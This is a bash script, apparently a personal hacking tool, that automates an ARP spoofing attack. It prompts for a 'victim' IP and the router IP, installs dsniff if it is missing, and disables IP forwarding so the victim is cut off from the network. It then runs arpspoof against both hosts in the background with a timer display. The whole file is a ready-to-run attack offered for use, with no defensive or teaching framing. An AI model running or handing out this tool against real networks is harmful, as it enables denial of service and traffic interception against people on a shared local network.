#!/bin/bash

# --- Color Definitions ---
green="\e[0;32m\033[1m"
endColor="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

# --- Cleanup Function (triggered by Ctrl+C) ---
# Defined at the beginning to be available throughout the script.
function cleanup() {
    stty echo # Restore terminal echo
    echo -e "\n\n${red}[!] Stopping the attack and restoring configuration...${endColor}"
    # Re-enables IP forwarding
    sysctl -w net.ipv4.ip_forward=1 > /dev/null
    
    # Stops the background arpspoof processes
    pkill arpspoof
    
    echo -e "${green}[+] Done! Exiting safely.${endColor}"
    exit 0
}

# Captures the interrupt signal (Ctrl+C) and calls the cleanup function
trap cleanup SIGINT

# --- Privilege and Dependency Checks ---

# Checks if the script is run as superuser (root)
if [[ $EUID -ne 0 ]]; then
   echo -e "${red}[!] Error: This script must be run with superuser privileges (sudo).${endColor}"
   exit 1
fi

# Checks if the 'arpspoof' command exists
if ! command -v arpspoof &> /dev/null; then
    echo -e "${yellow}[!] The 'arpspoof' tool (from the dsniff package) is not installed.${endColor}"
    read -e -p "    Do you want to install it now? (Y/n): " dsniff_response

    # If the response is 'Y' or 'y' (or if Enter is pressed)
    if [[ "$dsniff_response" =~ ^[Yy]?$ ]]; then
        echo -e "${green}[+] Attempting to install 'dsniff'...${endColor}"
        apt-get update > /dev/null
        apt-get install -y dsniff > /dev/null

        # Checks again if the installation was successful
        if ! command -v arpspoof &> /dev/null; then
             echo -e "${red}[!] Error: Could not install 'dsniff'. Please install it manually.${endColor}"
             exit 1
        fi
        echo -e "${green}[+] 'dsniff' has been installed successfully.${endColor}"
    else
        echo -e "${red}[!] Installation canceled by user. The script cannot continue.${endColor}"
        exit 1
    fi
fi

# Checks if the 'neofetch' command exists (optional)
if ! command -v neofetch &> /dev/null; then
    echo -e "${yellow}[!] The 'neofetch' tool is not installed (it's optional).${endColor}"
    read -e -p "    Do you want to install it now? (Y/n): " neofetch_response

    # If the response is 'Y' or 'y' (or if Enter is pressed)
    if [[ "$neofetch_response" =~ ^[Yy]?$ ]]; then
        echo -e "${green}[+] Attempting to install 'neofetch'...${endColor}"
        apt-get update > /dev/null
        apt-get install -y neofetch > /dev/null

        # Checks again if the installation was successful
        if ! command -v neofetch &> /dev/null; then
             echo -e "${red}[!] Error: Could not install 'neofetch'. The script will continue without this visual feature.${endColor}"
        else
             echo -e "${green}[+] 'neofetch' has been installed successfully.${endColor}"
        fi
    else
        echo -e "${yellow}[!] 'neofetch' installation skipped. The script will continue.${endColor}"
    fi
    # Short pause so the user can read the message before the screen clears.
    sleep 2
fi

# --- Script Start ---
clear
neofetch 

echo -e "${blue}"
cat << "EOF"
        __________  _____  _________    ______ _______  _______  ________   
        \______   \/  |  | \_   ___ \  /  __  \\   _  \ \   _  \ \______ \  
         |     ___/   |  |_/    \  \/  >      </  /_\  \/  /_\  \ |    |  \ 
         |    |  /    ^   /\     \____/   --   \  \_/   \  \_/   \|    `   \
         |____|  \____   |  \______  /\______  /\_____  /\_____  /_______  /
                      |__|         \/        \/       \/       \/        \/ 
EOF
echo -e "${endColor}"


echo -e "${blue}      ============================================================================${endColor}"
echo -e "${turquoise}      Welcome to the automatic ARP Spoofing tool${endColor}"
echo -e "${blue}      ============================================================================${endColor}"
sleep 2

# --- Network Interface Selection ---
echo -e
echo -e "${blue}[+] Please select your network interface:${endColor}"

# Saves network interfaces into an array named "interfaces"
interfaces=($(ls /sys/class/net))
i=1

# Loops through the array to display a numbered menu
for current_interface in "${interfaces[@]}"; do
  # NUMBERS in Turquoise and INTERFACES in Gray/White
  echo -e "  ${turquoise}[$i]${endColor} ${gray}$current_interface${endColor}"
  ((i++))
done
echo ""

# Asks the user to enter a number and saves it in the variable
read -e -p "Enter the number of your network interface: " interface_number

# --- INTERFACE VALIDATION AND SELECTION (KEY FIX) ---
# Subtracts 1 from the input number because bash arrays are 0-indexed
selected_index=$((interface_number - 1))

# Checks if the number is valid
if [[ -z "${interfaces[$selected_index]}" ]]; then
    echo -e "${red}[!] Invalid selection. Please run the script again.${endColor}"
    exit 1
fi

# Saves the name of the selected interface into a new variable
selected_interface="${interfaces[$selected_index]}"

echo -e "${green}[+] You have selected the interface: ${yellow}$selected_interface${endColor}"
sleep 1
clear
neofetch
# --- IP Prompt ---
echo -e
echo -e "${blue}[+] Now, please provide the following data:${endColor}"
read -e -p "Enter the victim's IP address: " victim_ip
read -e -p "Enter the router (gateway) IP address: " gateway_ip
clear
neofetch
echo -e "${green}[+] All set. The victim is ${yellow}$victim_ip${green} and the router is ${yellow}$gateway_ip${endColor}."
sleep 2

# --- Attack Start ---
echo -e "${blue}=============================${endColor}"
echo -e "${turquoise}   Ready to start${endColor}"
echo -e "${blue}=============================${endColor}"
read -e -p "$(echo -e ${red}"[!] Press Enter to start the attack..."${endColor})"

echo -e "\n${green}[+] Launching the attack in the background...${endColor}"

# Disables IP forwarding to ensure a DoS on the victim
sysctl -w net.ipv4.ip_forward=0 > /dev/null

# Launches the two arpspoof commands in the background
# -i: Interface, -t: Target
arpspoof -i $selected_interface -t $victim_ip $gateway_ip &> /dev/null &
arpspoof -i $selected_interface -t $gateway_ip $victim_ip &> /dev/null &

echo -e "${green}[+] The attack has started. ${red}Press Ctrl+C to stop it.${endColor}"

# --- Time Counter ---
echo ""
stty -echo # Disable keyboard echo
seconds=0
while true; do
  # Formats the seconds into a readable HH:MM:SS format
  formatted_time=$(printf '%02d:%02d:%02d' $((seconds/3600)) $((seconds%3600/60)) $((seconds%60)))
  # The \r moves the cursor to the beginning of the line without a newline
  echo -ne "${green}[+] Attack in progress. Time elapsed: ${yellow}${formatted_time}${endColor}\r"
  sleep 1
  ((seconds++))
done
